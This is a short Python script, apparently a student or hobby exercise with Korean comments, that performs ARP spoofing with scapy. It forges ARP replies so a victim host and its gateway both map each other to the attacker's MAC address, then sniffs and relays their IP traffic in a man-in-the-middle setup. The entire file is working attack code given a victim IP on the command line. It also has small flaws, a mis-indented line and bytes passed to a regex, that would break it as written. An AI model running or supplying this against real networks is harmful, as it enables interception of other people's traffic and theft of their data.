#-*- coding: utf-8 -*-

import sys
import scapy
import socket
import subprocess, shlex
import uuid
import re
import threading
import time
from scapy.sendrecv import sendp, sniff, srp
from scapy.all import *

def get_if ( ):
	strs =  subprocess.check_output(shlex.split('ip r l'))
	match_string = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
	ip = re.search('src '+ match_string, strs).group(1)
	gateway = re.search('default via ' + match_string, strs).group(1)
	return gateway , ip

def main ( ):

	global gatewayip
	global victimip
	global attackip
	
	global gatewaymac
	global victimmac
	global attackmac


	gatewayip , attackip = get_if() # 인터페이스 파싱
	victimip = sys.argv[1]

	gatewaymac = get_mac(gatewayip) # 맥주소 얻어오기
	victimmac = get_mac(victimip)
	attackmac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
	
	print("============================\n")
	print("Attack IP , MAC : %s + %s\n" % (attackip , attackmac))
	print("Victim IP , MAC : %s + %s\n" % (victimip , victimmac))
	print("Gateway IP , MAC : %s + %s\n" % (gatewayip , gatewaymac))
	print("============================\n")

	# 먼저 한 번 공격
	send(ARP(op=2, psrc=gatewayip , pdst=victimip , hwdst=victimmac ,hwsrc=attackmac))
	print("Attack packet!!!")
        send(ARP(op=2, psrc=victimip, pdst=gatewayip , hwdst=gatewaymac ,hwsrc=attackmac))
	print("Attack packet_back!!!")
	
	read_thread = threading.Thread(target=read)
	read_thread.start()
	
	while (1):

		send(ARP(op=2, psrc=gatewayip , pdst=victimip , hwdst=victimmac ,hwsrc=attackmac))
		print("Attack packet!!!")
		send(ARP(op=2, psrc=victimip, pdst=gatewayip , hwdst=gatewaymac ,hwsrc=attackmac))
		print("Attack packet_back!!!")
		time.sleep(1)

def read():
	sniff(count=0, prn= lambda p : read_info(p,gatewayip,victimip,gatewaymac,victimmac,attackmac))

def read_info (p, gatewayip, victimip, gatewaymac, victimmac, attackmac):
	# ip packet 이면
	if p.haslayer(IP):
		if(p[IP].src == gatewayip):
			p[Ether].src = attackmac
			p[Ether].dst = victimmac
			p[IP].src = gatewayip
			p[IP].dst = victimip
			send(p) # relay
		elif(p[IP].src == victimip):
			p[Ether].src = attackmac
			p[Ether].dst = gatewaymac
			p[IP].src = victimip
			p[IP].dst = gatewayip
			send(p) # relay

def get_mac(ip_address):
    res, un = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in res:
        return r[Ether].src
    return None

if __name__ == "__main__" :
	main()
